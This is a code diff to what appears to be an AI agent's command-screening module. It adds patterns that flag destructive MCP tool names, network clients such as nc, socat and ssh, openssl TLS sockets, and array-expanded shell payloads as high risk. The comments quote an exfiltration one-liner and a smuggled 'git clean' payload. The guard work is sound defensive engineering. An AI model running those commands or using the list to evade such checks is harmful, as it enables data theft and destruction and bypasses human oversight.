@@ -581,6 +581,19 @@ _AUTO_EXEC_MCP_TOOL_RE = re.compile(
     r")(?:[_\-]|$)",
     re.IGNORECASE,
 )
+# A destructive verb as a whole name segment: an honestly-named MCP tool
+# (delete_file, delete_repo, drop_table, purge_index) runs outside the terminal
+# sandbox and causes data loss, so auto prompts on it even when the arguments
+# carry no SQL/HTTP mutation marker. Non-destructive mutations (create/update/
+# add/set/insert/patch) still run; a read that merely contains one of these as
+# a substring (undelete, list_removed) does not match on the segment boundary.
+_AUTO_DESTRUCTIVE_MCP_VERB_RE = re.compile(
+    r"(?:^|[_\-])(?:"
+    r"delete|destroy|drop|purge|wipe|truncate|erase|remove|unlink|"
+    r"teardown|revoke|terminate|uninstall"
+    r")(?:[_\-]|$)",
+    re.IGNORECASE,
+)
 
 # Python: modules whose import alone signals side effects auto mode should ask
 # about (process spawning, network, bulk file ops, low-level memory).
@@ -2636,6 +2649,25 @@ _WGET_UPLOAD_FLAGS = frozenset({"--post-data", "--post-file", "--body-data", "--
 _PIPE_TO_INTERPRETER_RE = re.compile(
     r"\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh|fish|python[0-9.]*|node|ruby|perl|php)\b"
 )
+# Network clients beyond curl/wget that open a socket to a remote host: a plain
+# invocation reaches the network (the sandbox has no network namespace), so it
+# can exfil the workdir or fetch/run remote code. Matched only at command
+# position (start, or after a separator, past any NAME=value prefixes) so a
+# filename argument (scp ./ssh_notes.txt) is not misread as the command.
+_NETWORK_CLIENT_AT_CMD_RE = re.compile(
+    r"(?:^|[;&|\n(]|&&|\|\|)\s*(?:[A-Za-z_]\w*=\S*\s+)*"
+    r"(?:nc|ncat|netcat|telnet|socat|ssh|scp|sftp)\b"
+)
+# openssl's s_client/s_server open a TLS socket, the classic no-curl exfil
+# channel (tar czf - . | openssl s_client -connect host:443). Plain openssl
+# (dgst, enc) is local and stays out.
+_OPENSSL_NETWORK_RE = re.compile(r"\bopenssl\s+s_(?:client|server)\b")
+# An array expansion (${x[*]}, ${x[@]}) builds a command from elements the
+# static scan cannot resolve; fed to a shell -c/eval it runs an unscreened
+# payload (x=(git clean -fd); bash -c "${x[*]}"). Paired with the
+# var-executed-as-command test so a benign array print (echo "${a[@]}") is left
+# alone.
+_ARRAY_EXPANSION_RE = re.compile(r"\$\{\w+\[[@*]\]\}")
 # A wrapper's bare duration/count argument (timeout 5 rm, timeout 1.5s rm) that
 # precedes the real command, so it is not mistaken for the command itself.
 _WRAPPER_DURATION_RE = re.compile(r"\d+(?:\.\d+)?[smhd]?$")
@@ -2780,6 +2812,11 @@ def _command_is_network_exec_or_exfil(command: str) -> bool:
     substitution) or to upload local data. Plain downloads (curl -O, wget URL)
     are ordinary and stay out. Fails closed on an unparseable command."""
     low = command.lower()
+    # A non-curl/wget network client at command position (nc/ssh/scp/socat/...)
+    # or openssl's TLS socket is a remote reach in its own right, so gate it
+    # before the curl/wget-specific upload-flag logic below.
+    if _NETWORK_CLIENT_AT_CMD_RE.search(command) or _OPENSSL_NETWORK_RE.search(low):
+        return True
     has_curl = "curl" in low
     has_wget = "wget" in low
     if not has_curl and not has_wget:
@@ -2833,6 +2870,13 @@ def _terminal_is_high_risk(command: str, _depth: int = 0) -> bool:
     # so the token scan below cannot see the real command. When a command
     # substitution coincides with a variable executed as a command, fail closed.
     if _HAS_COMMAND_SUBST_RE.search(command) and _VAR_EXECUTED_AS_COMMAND_RE.search(command):
+        return True
+    # An array expansion built from literal-but-unresolved elements and then run
+    # as a command (x=(git clean -fd); bash -c "${x[*]}") carries no command
+    # substitution, so the check above misses it; assignment expansion does not
+    # resolve arrays either. Fail closed when an array expansion is executed as a
+    # command, while a benign array print (echo "${a[@]}") is untouched.
+    if _ARRAY_EXPANSION_RE.search(command) and _VAR_EXECUTED_AS_COMMAND_RE.search(command):
         return True
     for text in {normalized, expanded}:
         try:
@@ -3176,6 +3220,8 @@ def is_high_risk_tool_call(name: str, arguments: dict) -> bool:
         # path is a sensitive access; all prompt. Ordinary create/update/delete
         # MCP calls run in auto.
         if _AUTO_EXEC_MCP_TOOL_RE.search(tool_name):
+            return True
+        if _AUTO_DESTRUCTIVE_MCP_VERB_RE.search(tool_name):
             return True
         if _AUTO_SENSITIVE_MCP_NOUN_RE.search(tool_name):
             return True
